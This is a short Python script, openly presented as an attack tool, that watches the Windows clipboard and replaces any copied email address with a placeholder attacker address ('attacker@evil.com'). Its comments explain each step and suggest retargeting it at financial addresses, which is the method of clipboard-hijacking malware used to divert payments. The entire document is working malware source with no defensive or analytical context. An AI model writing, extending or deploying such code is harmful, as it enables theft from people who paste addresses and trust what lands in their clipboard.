# This script keeps an open connection with Windows clipboard, waits for it to contain an email address,
# and replaces the copied email adress in order to paste the attacker's email address for data extraction.
# Replace email addresses with finacial addresses or anything else!

import win32clipboard,re
from time import sleep
# The "sleep" function from Python's time library makes it so that the function doesn't constantly run, but at a specified interval.

attacker_email = "attacker@evil.com"
emailregex = '^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'

while True:
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData().rstrip()
    print(data)
    if (re.search(emailregex,data)):
    # Looks for an email address within the clipboard.
        win32clipboard.EmptyClipboard();
        win32clipboard.SetClipboardText(attacker_email)
        # Replaces the copied address with a malicious one.
        break
    win32clipboard.CloseClipboard()
    sleep(1)
    # Sleeps so function runs at regular intervals.
